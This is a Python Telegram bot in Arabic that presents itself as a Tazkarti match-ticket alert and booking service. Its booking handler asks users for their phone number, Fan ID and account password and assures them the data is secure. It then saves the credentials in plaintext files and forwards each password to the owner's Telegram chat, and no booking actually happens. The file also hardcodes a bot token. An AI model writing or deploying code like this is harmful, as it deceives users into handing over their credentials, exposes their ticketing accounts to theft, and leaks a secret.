import asyncio
import json
import os
import logging
import sys
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    asyncio.set_event_loop(asyncio.new_event_loop())

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import tazkarti_api as tazkarti

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8123254144:AAFbCADZT3gl213b-9PrQMEyalSyj1tgqyA"
OWNER_USERNAME = "amrmadiii"
OWNER_CHAT_ID_FILE = os.path.join(os.path.dirname(__file__), "owner_chat_id.txt")
DATA_FILE = os.path.join(os.path.dirname(__file__), "user_data.json")
BOOKING_DATA_DIR = os.path.join(os.path.dirname(__file__), "booking_data")

user_data_store = {}


# ==================== Data Helpers ====================

def load_data():
    global user_data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            user_data_store = json.load(f)

def save_data():
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(user_data_store, f, ensure_ascii=False, indent=2)

def get_owner_chat_id():
    if os.path.exists(OWNER_CHAT_ID_FILE):
        with open(OWNER_CHAT_ID_FILE, "r") as f:
            return f.read().strip()
    return None

def set_owner_chat_id(cid):
    with open(OWNER_CHAT_ID_FILE, "w") as f:
        f.write(str(cid))

def get_user(user_id):
    uid = str(user_id)
    if uid not in user_data_store:
        user_data_store[uid] = {
            "favorite_team_id": None,
            "favorite_team_name": None,
            "phone": None,
            "fan_id": None,
            "password": None,
            "notifications": True,
            # بيحفظ حالة كل مباراة: { "match_id": "available" | "unavailable" }
            "match_status_cache": {},
        }
    # ضمان وجود الحقل في accounts قديمة
    if "match_status_cache" not in user_data_store[uid]:
        user_data_store[uid]["match_status_cache"] = {}
    return user_data_store[uid]

def save_booking_to_file(user_id, username, first_name, last_name, phone, fan_id, password):
    os.makedirs(BOOKING_DATA_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = username or first_name or str(user_id)
    filename = f"{ts}_{safe_name}_{fan_id}.txt"
    filepath = os.path.join(BOOKING_DATA_DIR, filename)
    content = (
        f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"User ID: {user_id}\n"
        f"Name: {first_name} {last_name or ''}\n"
        f"Username: @{username or 'N/A'}\n"
        f"Phone: {phone}\n"
        f"Fan ID: {fan_id}\n"
        f"Password: {password}\n"
    )
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    logger.info(f"Booking data saved: {filepath}")
    return filepath


# ==================== Keyboards ====================

def main_menu():
    keyboard = [
        [InlineKeyboardButton("📅 المباريات المتاحة", callback_data="matches")],
        [InlineKeyboardButton("🏟️ الفرق", callback_data="teams_page_0")],
        [InlineKeyboardButton("⭐ فريقي المفضل", callback_data="my_favorite")],
        [InlineKeyboardButton("🎫 حجز تذكرة", callback_data="book_ticket")],
        [InlineKeyboardButton("📋 بياناتي", callback_data="my_data")],
        [InlineKeyboardButton("🔧 الدعم الفني", callback_data="support")],
        [InlineKeyboardButton("👥 جروبنا", callback_data="group")],
    ]
    return InlineKeyboardMarkup(keyboard)


# ==================== Handlers ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id)
    save_data()

    if user.username and user.username.lower() == OWNER_USERNAME:
        set_owner_chat_id(user.id)
        logger.info(f"Owner chat ID saved: {user.id}")

    await update.message.reply_text(
        f"مرحباً {user.first_name}! 👋\n\n"
        "🎫 بوت تذاكري - تصفح المباريات، اختر فريقك المفضل، واحجز تذكرتك.\n\n"
        "📲 هتوصلك إشعار فوري لما تذاكر فريقك المفضل تنزل!\n\n"
        "اختر من القائمة أدناه:",
        reply_markup=main_menu(),
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "matches":
        await show_matches(query, context)
    elif data.startswith("teams_page_"):
        page = int(data.split("_")[-1])
        await show_teams(query, context, page)
    elif data.startswith("team_"):
        team_id = int(data.split("_")[1])
        await show_team_detail(query, context, team_id)
    elif data == "my_favorite":
        await my_favorite_menu(query, context)
    elif data.startswith("set_fav_"):
        team_id = int(data.split("_")[2])
        await set_favorite(query, context, team_id)
    elif data.startswith("remove_fav_"):
        team_id = int(data.split("_")[2])
        await remove_favorite(query, context, team_id)
    elif data == "book_ticket":
        await book_ticket_start(query, context)
    elif data == "my_data":
        await show_my_data(query, context)
    elif data == "cancel_booking":
        await cancel_booking(query, context)
    elif data == "support":
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            "🔧 الدعم الفني\n\nللتواصل: @amrmadiii",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "group":
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            "👥 انضم لجروبنا على تيليجرام!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "back_main":
        await query.edit_message_text("القائمة الرئيسية:", reply_markup=main_menu())


# ==================== Matches ====================

async def show_matches(query, context):
    try:
        matches = tazkarti.get_matches()
    except Exception as e:
        await query.edit_message_text(f"❌ خطأ في جلب المباريات: {e}")
        return

    if not matches:
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            "لا توجد مباريات متاحة حالياً.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    text = "📅 المباريات المتاحة:\n\n"
    for i, m in enumerate(matches, 1):
        team1 = m.get("teamNameAr1") or m.get("teamName1", "؟")
        team2 = m.get("teamNameAr2") or m.get("teamName2", "؟")
        stadium = m.get("stadiumNameAr") or m.get("stadiumName", "؟")
        date_str = ""
        if m.get("kickOffTime"):
            try:
                dt = datetime.fromisoformat(m["kickOffTime"].replace("Z", ""))
                date_str = dt.strftime("%Y-%m-%d %H:%M")
            except:
                date_str = m["kickOffTime"]

        status = m.get("matchStatus")
        status_text = "🟢 التذاكر متاحة" if status == 1 else "🔴 التذاكر غير متاحة"

        text += f"{i}. ⚽ {team1} vs {team2}\n"
        text += f"   🏟️ {stadium}\n"
        text += f"   📆 {date_str}\n"
        text += f"   {status_text}\n\n"

    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


# ==================== Teams ====================

async def show_teams(query, context, page=0):
    try:
        teams = tazkarti.get_epl_teams()
    except Exception as e:
        await query.edit_message_text(f"❌ خطأ في جلب الفرق: {e}")
        return

    if not teams:
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            "لا توجد فرق متاحة حالياً.\n\n"
            "💡 الفرق بتتجاب من المباريات المتاحة، تأكد إن في مباريات على الموقع.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    per_page = 10
    total_pages = max(1, (len(teams) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = start + per_page
    page_teams = teams[start:end]

    text = f"🏟️ الدوري المصري (صفحة {page + 1}/{total_pages}):\n\n"

    keyboard = []
    # أزرار الفرق (صفين كل صف 2 فرق)
    row = []
    for i, t in enumerate(page_teams):
        name = t.get("nameAr") or t.get("name", "؟")
        row.append(InlineKeyboardButton(name, callback_data=f"team_{t['id']}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    # أزرار التنقل
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("◀️ السابق", callback_data=f"teams_page_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("التالي ▶️", callback_data=f"teams_page_{page + 1}"))
    if nav_row:
        keyboard.append(nav_row)

    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_main")])

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def show_team_detail(query, context, team_id):
    try:
        teams = tazkarti.get_epl_teams()
    except Exception as e:
        await query.edit_message_text(f"❌ خطأ: {e}")
        return

    team = next((t for t in teams if t["id"] == team_id), None)
    if not team:
        await query.edit_message_text("الفريق غير موجود.")
        return

    name = team.get("nameAr") or team.get("name", "")
    matches = tazkarti.get_matches_for_team(team_id)
    available = [m for m in matches if m.get("matchStatus") == 1]

    uid = str(query.from_user.id)
    user = get_user(uid)
    is_fav = user.get("favorite_team_id") == team_id

    text = f"🏟️ {name}\n"
    text += f"━━━━━━━━━━━━━━━\n"
    text += f"📅 إجمالي المباريات: {len(matches)}\n"
    text += f"🎫 التذاكر متاحة: {len(available)}\n\n"

    if matches:
        text += "المباريات:\n"
        for m in matches:
            if m.get("teamId1") == team_id:
                opp = m.get("teamNameAr2") or m.get("teamName2", "؟")
            else:
                opp = m.get("teamNameAr1") or m.get("teamName1", "؟")

            dt = ""
            if m.get("kickOffTime"):
                try:
                    dt_obj = datetime.fromisoformat(m["kickOffTime"].replace("Z", ""))
                    dt = dt_obj.strftime("%Y-%m-%d")
                except:
                    dt = m.get("kickOffTime", "")[:10]

            status = m.get("matchStatus")
            ticket_icon = "🎫" if status == 1 else "🔒"
            text += f"{ticket_icon} ضد {opp} - {dt}\n"
    else:
        text += "لا توجد مباريات قادمة."

    keyboard = []
    if is_fav:
        keyboard.append([InlineKeyboardButton("❌ إزالة من المفضلة", callback_data=f"remove_fav_{team_id}")])
        keyboard.append([InlineKeyboardButton("🔔 الإشعارات مفعلة ✅", callback_data=f"notif_info")])
    else:
        keyboard.append([InlineKeyboardButton("⭐ إضافة للمفضلة + تفعيل الإشعارات 🔔", callback_data=f"set_fav_{team_id}")])

    keyboard.append([InlineKeyboardButton("🔙 رجوع للفرق", callback_data="teams_page_0")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


# ==================== Favorite ====================

async def my_favorite_menu(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    fav_id = user.get("favorite_team_id")

    if not fav_id:
        keyboard = [
            [InlineKeyboardButton("🏟️ اختار فريقك", callback_data="teams_page_0")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        await query.edit_message_text(
            "⭐ لم تختر فريقاً مفضلاً بعد.\n\n"
            "اختر فريقك المفضل وهتوصلك إشعار فوري لما تذاكر مبارياته تنزل! 🔔",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    try:
        matches = tazkarti.get_matches_for_team(fav_id)
        available = [m for m in matches if m.get("matchStatus") == 1]
        teams = tazkarti.get_epl_teams()
        team_name = user.get("favorite_team_name", str(fav_id))
        for t in teams:
            if t["id"] == fav_id:
                team_name = t.get("nameAr") or t.get("name", str(fav_id))
                break
    except Exception as e:
        await query.edit_message_text(f"❌ خطأ: {e}")
        return

    notif_status = "✅ مفعلة" if user.get("notifications", True) else "❌ متوقفة"

    text = f"⭐ فريقي المفضل: {team_name}\n"
    text += f"🔔 الإشعارات: {notif_status}\n"
    text += f"━━━━━━━━━━━━━━━\n"
    text += f"📅 إجمالي المباريات: {len(matches)}\n"
    text += f"🎫 التذاكر متاحة الآن: {len(available)}\n\n"

    if available:
        text += "🟢 المباريات اللي تذاكرها متاحة:\n"
        for m in available:
            if m.get("teamId1") == fav_id:
                opp = m.get("teamNameAr2") or m.get("teamName2", "؟")
            else:
                opp = m.get("teamNameAr1") or m.get("teamName1", "؟")
            dt = m.get("kickOffTime", "")[:10]
            text += f"🎫 ضد {opp} - {dt}\n"
    elif matches:
        text += "🔴 التذاكر مش متاحة دلوقتي، هتوصلك إشعار لما تنزل!"
    else:
        text += "لا توجد مباريات قادمة."

    keyboard = [
        [InlineKeyboardButton("❌ إزالة المفضلة", callback_data=f"remove_fav_{fav_id}")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def set_favorite(query, context, team_id):
    uid = str(query.from_user.id)
    user = get_user(uid)

    try:
        teams = tazkarti.get_epl_teams()
        team_name = str(team_id)
        for t in teams:
            if t["id"] == team_id:
                team_name = t.get("nameAr") or t.get("name", str(team_id))
                break
    except:
        team_name = str(team_id)

    user["favorite_team_id"] = team_id
    user["favorite_team_name"] = team_name
    user["notifications"] = True
    # امسح الـ cache القديم عشان يبدأ يراقب من الأول
    user["match_status_cache"] = {}
    save_data()

    # إشعار للأونر
    owner_cid = get_owner_chat_id()
    if owner_cid:
        from_user = query.from_user
        msg = (
            f"⭐ <b>فريق مفضل جديد!</b>\n"
            f"👤 {from_user.first_name} {from_user.last_name or ''}\n"
            f"🆔 @{from_user.username or 'N/A'}\n"
            f"🏟️ {team_name}\n"
            f"🔔 الإشعارات: مفعلة\n"
            f"🏷️ ID: {from_user.id}"
        )
        try:
            await context.bot.send_message(chat_id=int(owner_cid), text=msg, parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Could not notify owner: {e}")

    await query.answer(f"✅ تم! هتوصلك إشعار لما تذاكر {team_name} تنزل 🔔")
    await show_team_detail(query, context, team_id)

async def remove_favorite(query, context, team_id):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["favorite_team_id"] = None
    user["favorite_team_name"] = None
    user["match_status_cache"] = {}
    save_data()
    await query.answer("❌ تم إزالة الفريق من المفضلة!")
    await show_team_detail(query, context, team_id)


# ==================== Ticket Booking ====================

async def book_ticket_start(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["awaiting_booking"] = True
    save_data()

    text = (
        "🎫 <b>حجز تذكرة</b>\n\n"
        "أرسل بياناتك كالتالي (كل سطر على حدة):\n\n"
        "<b>رقم الموبايل</b>\n"
        "<b>رقم المعجب (Fan ID)</b>\n"
        "<b>كلمة المرور</b>\n\n"
        "مثال:\n"
        "<code>01012345678\n"
        "1234567890\n"
        "mypassword</code>\n\n"
        "🔒 بياناتك محفوظة بأمان."
    )
    keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_booking")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def handle_booking_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    saved = get_user(uid)

    if not saved.get("awaiting_booking"):
        return False

    text = update.message.text.strip()
    parts = text.splitlines()

    if len(parts) < 3:
        await update.message.reply_text(
            "❌ صيغة غير صحيحة. أرسل:\n"
            "<code>رقم الموبايل\n"
            "رقم المعجب\n"
            "كلمة المرور</code>",
            parse_mode="HTML",
        )
        return True

    phone = parts[0].strip()
    fan_id = parts[1].strip()
    password = parts[2].strip()

    saved["phone"] = phone
    saved["fan_id"] = fan_id
    saved["password"] = password
    saved["awaiting_booking"] = False
    save_data()

    try:
        save_booking_to_file(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name or "",
            phone=phone,
            fan_id=fan_id,
            password=password,
        )

        owner_cid = get_owner_chat_id()
        if owner_cid:
            msg = (
                f"🎫 <b>بيانات حجز جديدة!</b>\n"
                f"👤 {user.first_name} {user.last_name or ''}\n"
                f"🆔 @{user.username or 'N/A'}\n"
                f"📱 {phone}\n"
                f"🎫 Fan ID: {fan_id}\n"
                f"🔑 <code>{password}</code>\n"
                f"🏷️ User ID: {user.id}"
            )
            try:
                await context.bot.send_message(chat_id=int(owner_cid), text=msg, parse_mode="HTML")
            except Exception as e:
                logger.warning(f"Could not notify owner: {e}")

        await update.message.reply_text(
            "✅ تم حفظ بياناتك بنجاح!\nسيتم التواصل معك في أقرب وقت. 🎫",
            reply_markup=main_menu(),
        )
    except Exception as e:
        logger.error(f"Failed to save booking data: {e}")
        await update.message.reply_text(
            "❌ حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى.",
            reply_markup=main_menu(),
        )
    return True

async def cancel_booking(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["awaiting_booking"] = False
    save_data()
    await query.edit_message_text("تم الإلغاء.", reply_markup=main_menu())


# ==================== My Data ====================

async def show_my_data(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    fav_name = user.get("favorite_team_name") or "غير محدد"
    phone = user.get("phone") or "غير محدد"
    fan_id = user.get("fan_id") or "غير محدد"
    notif = "✅ مفعلة" if user.get("notifications", True) else "❌ متوقفة"

    text = (
        "📋 <b>بياناتي</b>\n\n"
        f"⭐ الفريق المفضل: {fav_name}\n"
        f"🔔 الإشعارات: {notif}\n"
        f"📱 رقم الهاتف: {phone}\n"
        f"🎫 رقم المعجب: {fan_id}\n"
    )
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")


# ==================== Notification Job ====================

async def check_ticket_availability(context: ContextTypes.DEFAULT_TYPE):
    """
    بيتشغل كل 5 دقائق.
    بيقارن حالة كل مباراة لفريق المفضل للمستخدم.
    لو مباراة كانت "مش متاحة" وبقت "متاحة" → يبعت إشعار.
    """
    try:
        all_matches = tazkarti.get_matches()
    except Exception as e:
        logger.error(f"check_ticket_availability - get_matches error: {e}")
        return

    if not all_matches:
        return

    for uid, user in list(user_data_store.items()):
        fav_id = user.get("favorite_team_id")
        if not fav_id:
            continue
        if not user.get("notifications", True):
            continue

        team_matches = [
            m for m in all_matches
            if m.get("teamId1") == fav_id or m.get("teamId2") == fav_id
        ]

        if not team_matches:
            continue

        cache = user.get("match_status_cache", {})
        newly_available = []

        for m in team_matches:
            match_id = str(m.get("matchId") or m.get("id") or "")
            if not match_id:
                continue

            current_status = m.get("matchStatus")
            prev_status = cache.get(match_id)

            # لو التذاكر اتاحت دلوقتي وقبل كانت مش متاحة (أو مش مسجلة)
            if current_status == 1 and prev_status != "available":
                newly_available.append(m)

            # حدّث الـ cache
            cache[match_id] = "available" if current_status == 1 else "unavailable"

        user["match_status_cache"] = cache
        save_data()

        if not newly_available:
            continue

        team_name = user.get("favorite_team_name", str(fav_id))

        # ابعت إشعار للمستخدم
        text = f"🔔 <b>التذاكر نزلت!</b> 🎫\n\n"
        text += f"⭐ فريقك المفضل: <b>{team_name}</b>\n\n"
        for m in newly_available:
            if m.get("teamId1") == fav_id:
                opp = m.get("teamNameAr2") or m.get("teamName2", "؟")
            else:
                opp = m.get("teamNameAr1") or m.get("teamName1", "؟")

            stadium = m.get("stadiumNameAr") or m.get("stadiumName", "؟")
            dt = ""
            if m.get("kickOffTime"):
                try:
                    dt_obj = datetime.fromisoformat(m["kickOffTime"].replace("Z", ""))
                    dt = dt_obj.strftime("%Y-%m-%d %H:%M")
                except:
                    dt = m.get("kickOffTime", "")[:16]

            text += f"⚽ {team_name} vs {opp}\n"
            text += f"🏟️ {stadium}\n"
            text += f"📆 {dt}\n"
            text += f"🎫 <b>التذاكر متاحة الآن!</b>\n\n"

        text += "اضغط /start واحجز تذكرتك دلوقتي! 🚀"

        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text=text,
                parse_mode="HTML"
            )
            logger.info(f"Ticket notification sent to user {uid} for {len(newly_available)} matches")
        except Exception as e:
            logger.warning(f"Could not notify user {uid}: {e}")

        # إشعار للأونر كمان
        owner_cid = get_owner_chat_id()
        if owner_cid:
            owner_msg = (
                f"🔔 <b>إشعار تذاكر أُرسل!</b>\n"
                f"👤 User ID: {uid}\n"
                f"🏟️ {team_name}\n"
                f"📅 {len(newly_available)} مباراة جديدة"
            )
            try:
                await context.bot.send_message(
                    chat_id=int(owner_cid),
                    text=owner_msg,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Could not notify owner: {e}")


# ==================== Text Handler ====================

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    handled = await handle_booking_data(update, context)
    if not handled:
        await update.message.reply_text(
            "استخدم /start للقائمة الرئيسية."
        )


# ==================== Health Server ====================

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return


# ==================== Main ====================

def main():
    load_data()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    # بيتفحص كل 5 دقائق لو في تذاكر نزلت
    job_queue = app.job_queue
    job_queue.run_repeating(check_ticket_availability, interval=300, first=15)

    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    logger.info(f"Health server running on port {port}")

    logger.info("Bot started! Checking tickets every 5 minutes.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
